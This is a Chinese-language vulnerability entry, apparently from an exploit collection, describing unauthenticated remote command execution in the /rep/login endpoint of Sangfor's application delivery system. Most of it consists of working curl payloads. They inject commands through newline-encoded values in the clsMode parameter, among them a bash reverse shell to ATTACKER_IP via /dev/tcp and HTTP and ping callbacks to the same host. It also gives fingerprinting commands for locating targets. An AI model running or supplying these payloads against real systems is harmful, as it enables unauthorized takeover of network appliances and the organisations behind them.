---
id: SANGFOR-AD-LOGIN-RCE
title: 深信服应用交付管理系统 login 远程命令执行漏洞
product: sangfor
vendor: 深信服
version_affected: "AD 7.0.8 - 7.0.8R5"
severity: CRITICAL
tags: [rce, command_injection, 无需认证, 国产]
fingerprint: ["深信服", "Sangfor", "应用交付", "AD"]
---

## 漏洞描述

深信服应用交付管理系统（Sangfor AD）的 `/rep/login` 接口存在命令注入漏洞。`clsMode` 参数未正确过滤换行符，攻击者可通过 `%0A`（换行）注入任意系统命令，无需认证即可实现远程代码执行。

## 影响版本

- 深信服 AD 7.0.8
- 深信服 AD 7.0.8R5

## 前置条件

- 无需认证
- 管理接口可访问

## 利用步骤

1. 向 `/rep/login` 发送 POST 请求
2. 在 `clsMode` 参数中通过换行符注入命令
3. 命令在服务器端被执行

## Payload

### 执行命令

```bash
curl -sk "https://target/rep/login" \
  -d 'clsMode=cls_mode_login%0Aid%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123'
```

### DNS 回调验证

```bash
curl -sk "https://target/rep/login" \
  -d 'clsMode=cls_mode_login%0Aping+ATTACKER_IP%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123'
```

### 反弹 Shell

```bash
curl -sk "https://target/rep/login" \
  -d 'clsMode=cls_mode_login%0Abash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123'
```

## 验证方法

```bash
# 使用 DNS/HTTP 回调验证（盲注命令执行）
curl -sk "https://target/rep/login" \
  -d 'clsMode=cls_mode_login%0Acurl+http://ATTACKER_IP/callback%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123'
# 在 ATTACKER_IP 上监听: nc -lvp 80
```

## 指纹确认

```bash
curl -sk "https://target/rep/login" -o /dev/null -w "%{http_code}"
curl -sk "https://target/" | grep -i "Sangfor\|应用交付\|AD"
```
